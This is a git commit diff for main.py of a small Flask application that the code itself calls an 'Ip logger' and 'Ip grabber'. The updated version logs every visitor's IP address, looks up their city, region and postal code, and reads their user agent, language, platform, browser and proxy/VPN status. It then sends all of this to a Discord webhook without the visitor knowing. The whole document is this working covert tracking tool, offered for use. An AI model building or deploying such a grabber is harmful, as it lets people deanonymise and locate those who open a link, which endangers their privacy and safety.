71b9a7d8536debe93ff2076732dbc66fc612439a
baum1810 <72774679+baum1810@users.noreply.github.com>
2022-05-21 17:34:46 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,41 +1,55 @@
-from flask import Flask, request
+from flask import Flask, request, redirect,request
 from dhooks import Webhook, Embed
-import requests
-hook = Webhook("YOURWEBHOOK")
+import requests,json
+from os import system
+from urllib.request import urlopen
+try:
+  from werkzeug.useragents import UserAgent
+except:
+  system("pip install werkzeug==2.0")
+hook = Webhook("YOUR WEBHOOK HERE")
 app = Flask(__name__)
-@app.route('/')
+@app.route('/', methods = ['POST', 'GET'])
 def grabbing():
   if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
     publicip = request.environ['REMOTE_ADDR']
   else:
     publicip = request.environ['HTTP_X_FORWARDED_FOR']
-  city = requests.get(f'https://ipapi.co/{publicip}/city').text
-  region = requests.get(f'https://ipapi.co/{publicip}/region').text
-  postal = requests.get(f'https://ipapi.co/{publicip}/postal').text
-  timezone = requests.get(f'https://ipapi.co/{publicip}/timezone').text
-  currency = requests.get(f'https://ipapi.co/{publicip}/currency').text
-  country = requests.get(f'https://ipapi.co/{publicip}/country_name').text
-  callcode = requests.get(f"https://ipapi.co/{publicip}/country_calling_code").text
-  proxyunc = requests.get(f'https://api.xdefcon.com/proxy/check/?ip={publicip}').text
-  if '"proxy": true' in proxyunc:
-      proxy = "Yes"
-  else:
-      proxy = "No"
-  embed = Embed(
-      color=0x5CDBF0,
-      timestamp='now'
-  )
-  embed.set_footer(text='Coded by https://github.com/baum1810')
-  embed.add_field(name='Ip', value=publicip)
-  embed.add_field(name='City', value=city)
-  embed.add_field(name='Region', value=region)
-  embed.add_field(name='Postal', value=postal)
-  embed.add_field(name='Timezone', value=timezone)
-  embed.add_field(name='Currency', value=f'{currency}' )
-  embed.add_field(name='Country', value=country)
-  embed.add_field(name='Callcode', value=callcode)
-  embed.add_field(name='Proxy', value=proxy)#
-  hook.send(embed=embed)
+  url = f'https://ipinfo.io/{publicip}/json'
+  response = urlopen(url)
+  data = json.load(response)
 
+  region=data['region']
+  city=data['city']
+  country=data['country']
+  postal=data['postal']
+  useragent = request.user_agent.string
+  supported_languages = ["en", "nl", "it", 'de', 'ru', 'cn','in','hk']
+  lang = request.accept_languages.best_match(supported_languages)
+  user_agent = UserAgent(request.headers.get('User-Agent'))
+  platform = user_agent.platform
+  browser = request.user_agent.browser
+  r = requests.get(f"https://api.xdefcon.com/proxy/check/?ip={publicip}").text
+  if 'proxy": true,' in r:
+    proxy=True
+  else:
+    proxy=False
+  embed = Embed(
+    color=0x5CDBF0,
+    timestamp='now'  # sets the timestamp to current time
+    )
+  embed.set_author(name='Ip logger made by https://github.com/baum1810')
+  embed.add_field(name='Ip', value=publicip)
+  embed.add_field(name='County', value=country)
+  embed.add_field(name='Region', value=region)
+  embed.add_field(name='City', value=city)
+  embed.add_field(name='Postal', value=postal)
+  embed.add_field(name='Useragent', value=useragent)
+  embed.add_field(name='Browser Language', value=lang)
+  embed.add_field(name='Platform', value=platform)
+  embed.add_field(name='Browser', value=browser)
+  embed.add_field(name='Proxy/Vpn', value=proxy)
+  hook.send(embed=embed)
+  return "Ip grabber by https://github.com/baum1810"
   
 app.run(debug=False,host='0.0.0.0', port=8000)
